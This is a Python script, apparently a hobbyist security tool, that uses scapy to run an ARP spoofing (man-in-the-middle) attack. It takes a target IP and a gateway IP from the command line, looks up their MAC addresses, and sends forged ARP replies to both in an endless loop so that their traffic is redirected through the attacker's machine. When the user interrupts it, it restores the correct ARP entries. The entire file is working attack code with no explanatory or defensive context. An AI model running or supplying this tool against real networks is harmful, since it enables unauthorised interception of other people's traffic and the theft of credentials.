import scapy.all as scapy
import time
import argparse

def get_user_input():
    parse_object = argparse.ArgumentParser()
    parse_object.add_argument("-t","--target",dest="target_ip",help="Enter Target IP",required=True)
    parse_object.add_argument("-g","--gateway",dest="gateway_ip",help="Enter Gateway Ip",required=True)
    args =  parse_object.parse_args()

    if not args.target_ip:
        print("Enter TARGET IP")
    
    if not args.gateway_ip:
        print("Enter Gateway IP")
    
    return args

def get_mac_address(ip):
    arp_request_packet = scapy.ARP(pdst=ip) # scapy.ls(scapy.ARP()) == help

    broadcast_packet = scapy.Ether(dst='ff:ff:ff:ff:ff:ff') # scapy.ls(scapy.ARP()) == help

    combined_packet =  broadcast_packet / arp_request_packet

    answer_list = scapy.srp(combined_packet,timeout=1,verbose=False)[0]

    return answer_list[0][1].hwsrc



# Create ARP response
def arp_poisoning(target_ip,poisoned_ip): 
    target_mac_address = get_mac_address(target_ip)
    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac_address,psrc=poisoned_ip)
    scapy.send(arp_response,verbose=False)


def finish_poisoning(fooled_ip,gateway_ip): 
    fooled_mac_address = get_mac_address(fooled_ip)
    gatewap_mac_address = get_mac_address(gateway_ip)

    arp_response = scapy.ARP(op=2,pdst=fooled_ip,hwdst=fooled_mac_address,psrc=gateway_ip,hwsrc=gatewap_mac_address)
    scapy.send(arp_response,verbose=False,count=10)


count_packets = 0

target_ips = get_user_input()
user_target_ip = target_ips.target_ip
user_gateway_ip = target_ips.gateway_ip

try:   
    while True:

        arp_poisoning(user_target_ip,user_gateway_ip) # arp_poisoning({target_ip},{gateway_ip})
        arp_poisoning(user_gateway_ip,user_target_ip) # arp_poisoning({gateway_ip},{target_ip})
        count_packets +=2
        print("\rSending packets... " + str(count_packets),end="")
        time.sleep(4)
except KeyboardInterrupt:
    print("\nQuit and Reset")
    finish_poisoning(user_target_ip,user_gateway_ip) # finish_poisoning({target_ip},{gateway_ip})
    finish_poisoning(user_gateway_ip,user_target_ip) # finish_poisoning({gateway_ip},{target_ip})
